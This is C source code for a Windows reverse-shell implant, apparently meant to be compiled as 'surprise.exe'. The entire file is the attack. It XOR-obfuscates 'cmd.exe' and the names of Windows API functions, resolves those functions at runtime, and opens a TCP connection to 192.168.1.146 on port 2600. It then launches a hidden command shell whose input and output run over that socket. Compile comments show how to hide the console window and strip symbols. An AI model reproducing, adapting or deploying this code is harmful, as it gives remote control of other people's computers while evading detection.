#include "implant.h"
// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32
// futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -mwindows -s
int main(){
// Set variables
    char rcvbuffer[DEFAULT_BUFLEN];
    char sndbuffer[DEFAULT_BUFLEN];
    char command[] = { 0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00 };
    char s_kernel[] = { 0x20, 0x2E, 0x39, 0x25, 0x2E, 0x27, 0x78, 0x79, 0x65, 0x2F, 0x27, 0x27, 0x00 }; // kernel32.dll
    char s_createproc[] = { 0x08, 0x39, 0x2E, 0x2A, 0x3F, 0x2E, 0x1B, 0x39, 0x24, 0x28, 0x2E, 0x38, 0x38, 0x0A, 0x00 }; // CreateProcessA
    char s_ws2_32[] = { 0x3C, 0x38, 0x79, 0x14, 0x78, 0x79, 0x00 }; // ws2_32.dll
    decode(command, 'K', 7);
    decode(s_kernel, 'K', sizeof(s_kernel) - 1);
    decode(s_createproc, 'K', sizeof(s_createproc) - 1);
    decode(s_ws2_32, 'K', sizeof(s_ws2_32) - 1);
    WSADATA wsa;
    SOCKADDR_IN server;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;


    //Get a handle in a DLL Windows that is already mapped
    HMODULE hKernel32 = GetModuleHandleA(s_kernel);
    //Locate the memory adress of the function "CreateProcessA"
    pCreateProcessA myCreateProcess = (pCreateProcessA)GetProcAddress(hKernel32, s_createproc);
    //look for a DLL on disk drive and load it
    HMODULE hWs2_32 = LoadLibraryA(s_ws2_32);


    char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; //WSAStartup
    char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00};//WSASocketA
    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};//connect
    decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
    decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
    decode(s_connect, 'K', sizeof(s_connect) - 1);

    // Locate network functions
    pWSAStartup myWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, s_WSAStartup);
    pWSASocketA myWSASocket = (pWSASocketA)GetProcAddress(hWs2_32, s_WSASocketA);
    pConnect myConnect = (pConnect)GetProcAddress(hWs2_32, s_connect);


    //execution
    myWSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET soc = myWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    //clean the struct sinfo & pinfo
    memset(&sinfo, 0, sizeof(sinfo));
    memset(&pinfo, 0, sizeof(pinfo));

    // Assign the count of binary of the struct size
    sinfo.cb = sizeof(sinfo);



    sinfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = (HANDLE)soc;
    sinfo.hStdOutput = (HANDLE)soc;
    sinfo.hStdError = (HANDLE)soc;

    // set server's variables
    server.sin_family = AF_INET;
    server.sin_port = htons(2600);
    server.sin_addr.s_addr = inet_addr("192.168.1.146");

    myConnect(soc, (struct sockaddr *)&server, sizeof(server));

    if (myCreateProcess != NULL) {
        myCreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
    }
    














    
// cleanup
    closesocket(soc);
    WSACleanup();

    return 0;
}


char* decode(char* message, char key, int lenght){
    for (int i = 0; i < lenght; i++){
        message[i] = message[i] ^ key;
    }
    return message;
}